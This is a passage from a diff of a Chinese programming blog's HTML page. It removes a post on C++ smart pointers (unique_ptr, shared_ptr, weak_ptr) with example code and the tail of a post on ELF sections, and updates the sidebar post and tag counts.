.debug_abbrev     PROGBITS         0000000000000000  00003432       00000000000001d9  0000000000000000           0     0     1</span><br><span class="line">[29] .debug_line       PROGBITS         0000000000000000  0000360b       0000000000000114  0000000000000000           0     0     1</span><br><span class="line">[30] .debug_str        PROGBITS         0000000000000000  0000371f       0000000000000235  0000000000000001  MS       0     0     1</span><br><span class="line">[31] .debug_ranges     PROGBITS         0000000000000000  00003954       0000000000000060  0000000000000000           0     0     1</span><br><span class="line">[32] .symtab           SYMTAB           0000000000000000  000039b8       0000000000000750  0000000000000018          33    52     8</span><br><span class="line">[33] .strtab           STRTAB           0000000000000000  00004108       0000000000000298  0000000000000000           0     0     1</span><br><span class="line">[34] .shstrtab         STRTAB           0000000000000000  000043a0       0000000000000151  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure>
-
-<p>将上述代码编译运行打印出的结果对应到elf格式中相应的区域如下：</p>
-<p><img src="/images/cpp/variable.png" alt="variable"></p>
-<ul>
-<li>所有代码无聊作何标记全部存储在<code>.text</code>段，换句话说从汇编的角度可以调用任何函数都可以被调用</li>
-<li>全局的<code>const</code>常量存放在<code>.rodata</code>段</li>
-<li>局部的<code>const</code>常量则存储在栈空间内，而常量的右值<code>127</code>则存放在<code>.text</code>段</li>
-<li>已经初始化的全局变量或<code>static</code>变量存放在<code>.data</code>段</li>
-<li>未初始化的全局变量存放在<code>bss</code>段</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2021/09/23/language/cpp/smart-pointers/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="博">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Bolog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/09/23/language/cpp/smart-pointers/" class="post-title-link" itemprop="url">C++智能指针</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-09-23 14:54:21" itemprop="dateCreated datePublished" datetime="2021-09-23T14:54:21+08:00">2021-09-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-09-09 15:57:18" itemprop="dateModified" datetime="2024-09-09T15:57:18+08:00">2024-09-09</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/language/" itemprop="url" rel="index"><span itemprop="name">language</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>智能指针，从其本质上说，就是要控制对象的销毁时机。换句话讲就是何时调用对象的析构函数。从C++11开始引入三个智能指针（<code>unique_ptr</code>,<code>shared_ptr</code>,<code>weak_ptr</code>），准确的说是四种（还有<code>auto_ptr</code>），但从C++17开始<code>auto_ptr</code>被移除了。所以就剩下上述三种了。所有的智能指针都包含在<code>memory</code>头文件中。</p>
-<p>首先，很久以前的C++是没有智能指针的，用户创建在堆上的内存，智能自己显示的释放，如果没有释放就会造成内存泄漏。这种特点导致C++的使用成本很高，为了降低成本，引入了智能指针<code>unique_ptr</code>和<code>shared_ptr</code>。</p>
-<h2 id="unique-ptr"><a href="#unique-ptr" class="headerlink" title="unique_ptr"></a>unique_ptr</h2><p><code>unique_ptr</code>采用的是传递所有权的方式来控制对象的销毁时机。如其名字所示，其对象是独享的。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> m_a;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple %d\n&quot;</span>, m_a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple func \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">            m_a = n;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">const</span> Simple&amp; p) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Copy Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ~<span class="built_in">Simple</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unique_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// unique ptr</span></span><br><span class="line">    <span class="keyword">auto</span> s_ptr = std::<span class="built_in">make_unique</span>&lt;Simple&gt;(<span class="number">1</span>);</span><br><span class="line">    s_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    std::unique_ptr&lt;Simple&gt; s_copy_ptr = std::<span class="built_in">move</span>(s_ptr);</span><br><span class="line">    s_copy_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Simple&gt; s_ptr_2(s_ptr);   // 无法编译通过</span></span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Simple&gt; s_ptr_2 = s_ptr;  // 无法编译通过</span></span><br><span class="line">    s_ptr-&gt;<span class="built_in">showfunc</span>();</span><br><span class="line">    <span class="comment">//s_ptr-&gt;Show();    // 当所有权变更后就不该再用之前的指针访问对象资源。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>unique_ptr</code>禁用拷贝构造<br>  由于<code>unique_ptr</code>禁用了拷贝构造函数<code>unique_ptr(const unique_ptr&amp;) = delete;</code>，所以一切试图触发拷贝构造函数的操作都会引发编译错误。</li>
-<li><code>unique_ptr</code>所有权一旦变更就不能使用原指针访问对象资源<br>  上述代码中有两处使用了原指针访问对象资源，第一处<code>s_ptr-&gt;showfunc();</code>没有报错，可以正常打印；<code>s_ptr-&gt;Show();</code>中使用到了成员变量<code>m_a</code>所以会导致报错“<code>this</code>空指针”。这是由于<code>std::move</code>的赋值操作触发了<code>unique_ptr</code>中的Move构造函数(<code>unique_ptr(unique_ptr&amp;&amp;) = default;</code>)，从而将<code>s_ptr</code>中的成员清空。所以再次访问原对象指针，就会出错。</li>
-</ul>
-<h2 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="shared_ptr"></a>shared_ptr</h2><p><img src="/images/cpp/shared_ptr.png" alt="shared_ptr"></p>
-<p><code>shared_ptr</code>采用的是引用计数的机制来控制对象的销毁时机。如其名字所示，其对象是共享的。当计数器等于0是，调用对象的析构函数。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test_inner</span><span class="params">(std::shared_ptr&lt;Simple&gt; *steal_ptr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// share ptr</span></span><br><span class="line">    <span class="keyword">auto</span> s_ptr = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">1</span>);</span><br><span class="line">    s_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    <span class="function">std::shared_ptr&lt;Simple&gt; <span class="title">s_copy_ptr</span><span class="params">(s_ptr)</span></span>;</span><br><span class="line">    s_copy_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    std::shared_ptr&lt;Simple&gt; s_ptr_2 = s_ptr;</span><br><span class="line">    s_ptr_2-&gt;<span class="built_in">Show</span>();</span><br><span class="line">    <span class="comment">// try steal</span></span><br><span class="line">    *steal_ptr = s_ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">shared_test_leak</span>();</span><br><span class="line">    std::shared_ptr&lt;Simple&gt; s_ptr;</span><br><span class="line">    <span class="built_in">shared_test_inner</span>(&amp;s_ptr);</span><br><span class="line">    s_ptr-&gt;<span class="built_in">Show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>尽可能使用<code>make_shared</code>创建<code>shared_ptr</code>，如果使用<code>std::shared_ptr&lt;Simple&gt; s_ptr(new Simple(1))</code>创建<code>shared_ptr</code>，需要分配两次内存，一次是<code>new Simple(1)</code>；另一次是<code>shared_ptr</code>的引用计数。<code>make_shared</code>只分配一次。</p>
-<p>现在创建一个<code>SimpleBack</code>类，然后再让<code>Simple</code>和<code>SimpleBack</code>循环引用。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> m_a;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple %d\n&quot;</span>, m_a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple func \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">            m_a = n;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">const</span> Simple&amp; p) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Copy Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ~<span class="built_in">Simple</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        std::shared_ptr&lt;SimpleBack&gt; m_sb;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        std::shared_ptr&lt;Simple&gt; m_s;</span><br><span class="line">        ~<span class="built_in">SimpleBack</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SimpleBack Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> s = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">auto</span> sb = std::<span class="built_in">make_shared</span>&lt;SimpleBack&gt;();</span><br><span class="line"></span><br><span class="line">    s-&gt;m_sb = sb;</span><br><span class="line">    sb-&gt;m_s = s;</span><br><span class="line">    <span class="comment">// 通过打印语句可以看到 s和sb的析构函数并没有调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过析构函数函数的打印语句可以看出<code>s</code>和<code>sb</code>并没有被析构，这说明<code>s</code>和<code>sb</code>泄漏了。</p>
-<p>为了解决<code>shared_ptr</code>在循环依赖中内存泄漏的问题，推出了<code>weak_ptr</code>。</p>
-<h2 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="weak_ptr"></a>weak_ptr</h2><p><code>weak_ptr</code>不会增加引用计数，不能直接操作对象的内存（需要先调用<code>lock</code>接口），需要和<code>shared_ptr</code>配套使用。</p>
-<p>将上述代码改成这样：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> m_a;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple %d\n&quot;</span>, m_a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showfunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello Simple func \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">            m_a = n;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Simple</span>(<span class="type">const</span> Simple&amp; p) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Copy Construct\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ~<span class="built_in">Simple</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Simple Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        std::shared_ptr&lt;SimpleBack&gt; m_sb;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleBack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 将循环引用的其中一个改成weak_ptr</span></span><br><span class="line">        std::weak_ptr&lt;Simple&gt; m_s;</span><br><span class="line">        ~<span class="built_in">SimpleBack</span>() &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SimpleBack Destroy\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shared_test_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> s = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">auto</span> sb = std::<span class="built_in">make_shared</span>&lt;SimpleBack&gt;();</span><br><span class="line"></span><br><span class="line">    s-&gt;m_sb = sb;</span><br><span class="line">    sb-&gt;m_s = s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过析构函数的打印语句可以看出，<code>s</code>和<code>sb</code>的析构函数在<code>shared_test_lead()</code>调用结束后被调用。</p>
-<p>那么，<code>weak_ptr</code>的使用是不是也像<code>shared_ptr</code>一样呢？不是的。<code>weak_ptr</code>需要与<code>shared_ptr</code>配合使用，看一个例子。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">weak_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::weak_ptr&lt;Simple&gt; w;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> s = std::<span class="built_in">make_shared</span>&lt;Simple&gt;(<span class="number">3</span>);</span><br><span class="line">        w = s;</span><br><span class="line">        <span class="keyword">auto</span> s2 = w.<span class="built_in">lock</span>();</span><br><span class="line">        <span class="keyword">if</span>(s2 != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            s2-&gt;<span class="built_in">Show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(w.<span class="built_in">expired</span>()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;object &#x27;s&#x27; is destroied. \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>lock</code><br>  若对象已被析构，则返回一个空的<code>shared_ptr</code>；否则返回实际的<code>shared_ptr</code>。</li>
-<li><code>expired</code><br>  若对象已被析构，则返回<code>true</code>；否则返回<code>false</code></li>
-</ul>
-<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
-<li><a target="_blank" rel="noopener" href="http://senlinzhan.github.io/2015/04/24/%E6%B7%B1%E5%85%A5shared-ptr/">谈谈 shared_ptr 的那些坑</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cb3e574eee5f">智能指针的线程安全</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qingdujun/article/details/74858071">C++14 智能指针unique_ptr、shared_ptr、weak_ptr</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Solstice/archive/2013/01/28/2879366.html">为什么多线程读写 shared_ptr 要加锁？</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1893,7 +1862,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">141</span>
+          <span class="site-state-item-count">143</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1906,7 +1875,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-count">122</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
